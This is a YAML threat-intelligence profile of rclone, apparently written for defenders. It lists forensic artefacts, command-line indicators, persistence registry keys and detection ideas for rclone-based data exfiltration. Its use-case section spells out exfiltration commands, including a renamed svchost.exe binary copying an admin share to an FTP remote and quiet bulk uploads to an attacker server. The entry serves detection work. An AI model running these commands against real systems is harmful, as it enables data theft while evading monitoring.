Name: rclone
Description: >
  rclone is a command-line utility for managing and transferring files to and from cloud
  storage services. It supports dozens of providers and protocols, including S3-compatible
  storage, Google Drive, OneDrive, WebDAV, FTP, and SFTP. Threat actors, particularly
  ransomware groups, frequently abuse rclone for data exfiltration due to its flexibility,
  high performance, support for encrypted transfers, and ability to run silently using
  custom configuration files and masqueraded binaries.
Category: third-party
Platform:
  - Windows
  - Linux
  - macOS
Execution:
  - cli
Capabilities:
  - file-sync                # Synchronize or copy files between local and remote locations.
  - cloud-sync               # Native support for many cloud storage providers.
  - encrypted-transfer       # Uses TLS/HTTPS or encrypted tunnels where supported.
  - direct-to-cloud          # Uploads data directly to remote cloud endpoints.
  - background-execution     # Commonly executed non-interactively or via scripts.
  - stealth-upload           # Can suppress output and logging for quiet operation.
  - proxy-support            # Supports routing traffic through HTTP/SOCKS proxies.
  - protocol-tunneling       # Supports non-HTTP protocols such as FTP, WebDAV, and SFTP.
  - scriptable-execution     # Easily embedded in automated or malware-driven workflows.
Forensics:
  BinaryLocations:
    - C:\Users\<user>\rclone.exe
    - /usr/bin/rclone
    - /usr/local/bin/rclone
  FileNamePatterns:
    - rclone.exe
    - rclone64.exe
  CommandLineArgs:
    Description: Command-line options frequently observed in rclone-based exfiltration.
    Indicators:
      - copy                   # One-time data copy to remote destination.
      - sync                   # Continuous synchronization of local data to remote.
      - --config               # Use of custom configuration file.
      - --ignore-existing      # Avoid re-uploading existing files.
      - --auto-confirm         # Suppress confirmation prompts.
      - --multi-thread-streams # Increase parallel upload throughput.
      - --transfers            # Control number of concurrent file transfers.
      - --no-check-certificate # Disable TLS certificate validation.
      - -q                     # Quiet mode; suppress output.
  ConfigFiles:
    - C:\Users\<username>\AppData\Roaming\rclone\rclone.conf
    - ~/.config/rclone/rclone.conf
  RegistryPersistence:
    - HKCU\Software\Microsoft\Windows\CurrentVersion\Run\rclone_service
    - HKLM\Software\Microsoft\Windows\CurrentVersion\Run\rclone_updater
  LogFiles:
    - C:\Users\<username>\AppData\Local\rclone\rclone.log
    - TEMP\rclone-activity.log
    - /var/log/rclone.log
  NetworkArtifacts:
    Description: >
      rclone communicates directly with remote cloud or storage endpoints defined in its
      configuration file. Because destinations vary by provider and attacker choice,
      network indicators alone are insufficient without endpoint context.
  ScheduledTask: []
NetworkBehavior:
  Description: >
    rclone-based exfiltration is characterized by sustained, high-throughput outbound
    transfers initiated by a command-line utility. Attackers often configure one-way
    uploads, run rclone under masqueraded process names, and use parallel transfers to
    rapidly exfiltrate large data sets.
  Behaviors:
    - High-volume outbound data transfers over extended periods
    - Parallel upload streams using multiple concurrent connections
    - One-way synchronization or copy operations with no inbound traffic
    - Execution under renamed binaries resembling system processes
    - Use of non-HTTP protocols (FTP, WebDAV, SFTP) for exfiltration
ThreatActors:
  - ransomware
  - apt
UseCases:
  - Title: Standard cloud upload
    Description: Upload a directory to remote cloud storage using default configuration.
    Command: rclone copy /data remote:backup
  - Title: Masqueraded exfiltration with custom config
    Description: Renamed rclone binary used with a custom configuration file.
    Command: |
      svchost.exe --config svchost.conf copy "\\Server\C$\Share" ftp1:/domain/share
  - Title: Ransomware-style bulk exfiltration
    Description: High-speed upload with filtering and concurrency tuning.
    Command: |
      rclone.exe copy "\\BACKUP\E:\" remote:Groups --exclude "*.{psd,rar,zip}"
      --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P
  - Title: FTP-based exfiltration
    Description: Upload data to attacker-controlled FTP server with minimal output.
    Command: |
      rclone copy \\192.168.1.100\f$ st:/home/user/data
      --exclude "*.{iso,exe,zip}" --ignore-existing --auto-confirm -q --transfers 5
Detection:
  - Type: Suspicious Parent Process
    Description: >
      Detect rclone execution spawned by scripting engines, Office applications, or
      other uncommon parent processes.
  - Type: Masquerading Detection
    Description: >
      Alert when binaries named svchost.exe, rundll32.exe, or sihost.exe execute with
      rclone-specific command-line arguments.
  - Type: Non-Standard Protocol Usage
    Description: >
      Monitor rclone usage over FTP, WebDAV, or SFTP from systems not designated for backups.
  - Type: Large Data Transfer
    Description: >
      Correlate rclone execution with sustained high bytes_out following file staging
      or archive creation.
  - Type: Persistence Mechanism
    Description: >
      Detect creation of registry Run keys or scheduled execution referencing rclone.
References:
  - https://attack.mitre.org/techniques/T1567/002/
  - https://attack.mitre.org/techniques/T1048/
  - https://attack.mitre.org/techniques/T1036/
  - https://redcanary.com/blog/threat-detection/rclone-mega-extortion/
  - https://www.sentinelone.com/blog/how-rclone-became-a-favorite-tool-for-ransomware-data-exfiltration/
  - https://unit42.paloaltonetworks.com/threat-assessment-rclone-data-exfiltration/
